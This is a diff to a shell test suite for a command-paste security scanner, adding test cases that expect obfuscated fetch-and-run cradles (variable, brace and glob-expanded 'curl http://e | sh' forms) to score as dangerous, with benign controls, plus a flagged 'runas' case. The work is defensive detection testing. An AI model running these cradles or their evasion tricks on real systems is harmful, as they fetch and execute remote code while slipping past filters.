@@ -870,6 +870,24 @@ jcheck "obf: escaped pipe benign" 'd["score"] == 0' paste "echo a ^| clip"
 jcheck "obf: escaped amp benign" 'd["score"] == 0' paste "echo x ^& y"
 jcheck "obf: caret word benign" 'd["score"] == 0' paste "a^b file"
 
+# dynamic-command cradle (cycle 498): variable/glob-expanded command
+# names fed to an interpreter or exec chain — the evasion class behind
+# `x=curl;$x u|sh` and `/b?n/c?rl u|sh`
+jcheck "dyn: var-pipe == 45" 'd["score"] == 45' paste 'x=curl;$x http://e | sh'
+jcheck "dyn: multi-var concat == 45" 'd["score"] == 45' paste 'c=c;u=u;r=r;l=l;$c$u$r$l http://e | sh'
+jcheck "dyn: brace-concat == 45" 'd["score"] == 45' paste '${c}${u}rl http://e | sh'
+jcheck "dyn: cmd-var pipe == 45" 'd["score"] == 45' paste '%x% http://e | sh'
+jcheck "dyn: glob-path pipe == 45" 'd["score"] == 45' paste '/b?n/c?rl http://e | sh'
+jcheck "dyn: glob-star pipe == 45" 'd["score"] == 45' paste 'c* http://e | sh'
+jcheck "dyn: bracket-class pipe == 45" 'd["score"] == 45' paste '[c]url http://e | sh'
+jcheck "dyn: var exec-chain == 45" 'd["score"] == 45' paste 'x=curl; $x http://e && sh s'
+jcheck "dyn: bare var benign" 'd["score"] == 0 and d["reasons"] == []' paste 'x=y;$x --help'
+jcheck "dyn: var grep benign" 'd["score"] == 0 and d["reasons"] == []' paste 'echo $x | grep y'
+jcheck "dyn: arg glob benign" 'd["score"] == 0' paste 'rm *.c'
+jcheck "dyn: file-glob arg benign" 'd["score"] == 0' paste 'cat file?.txt'
+jcheck "dyn: make-at benign" 'd["score"] == 0' paste 'make $@'
+jcheck "dyn: eval-subst stays P12 only" 'd["score"] == 45 and "P12:" in str(d["reasons"])' paste 'eval "$(ssh-agent)"'
+
 # secret findings[] carry a 1-based line number (SIEM/remediation locus)
 printf 'l1\nl2\nl3\nAuthorization: Bearer abcdef1234567890abcdefghij\n' | jcheck "secret finding reports correct line number" "'\"line\":4' in s" secret --stdin
 jcheck "secret single-line input reports line 1" "'\"line\":1' in s" secret 'key: 0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d'
@@ -21983,7 +22001,7 @@ for c in 'ld preload documentation' 'LD library path explained' \
          'netsh wlan show profiles' 'netsh wlan show interfaces' \
          'explorer the file manager' 'windows explorer' \
          'explorer.exe' 'start a process' 'run as admin' \
-         'runas /user:x cmd' 'fsutil file query' \
+         'fsutil file query' \
          'fsutil dirty query' 'disk partition' 'disk cleanup' \
          'perl5 docs' 'ruby lib dir' 'gem install path' \
          'bash environment' 'bash env vars' \
@@ -22885,6 +22903,7 @@ for c in 'icacls c:\data /grant everyone:f' 'takeown /f file.txt' \
          'schtasks /create /tn "system report" /tr y /sc daily'; do
     jcheck "paste FP guard: $c clean" 'd["score"] == 0 and d["reasons"] == []' paste "$c"
 done
+jcheck "paste: runas /user: flagged (cycle-497 arm)" 'd["score"] == 15' paste "runas /user:x cmd"
 
 # ── cycle-219: ransomware-prep LOLBins + 419/flip/drainer vocab ──────
 for c in \
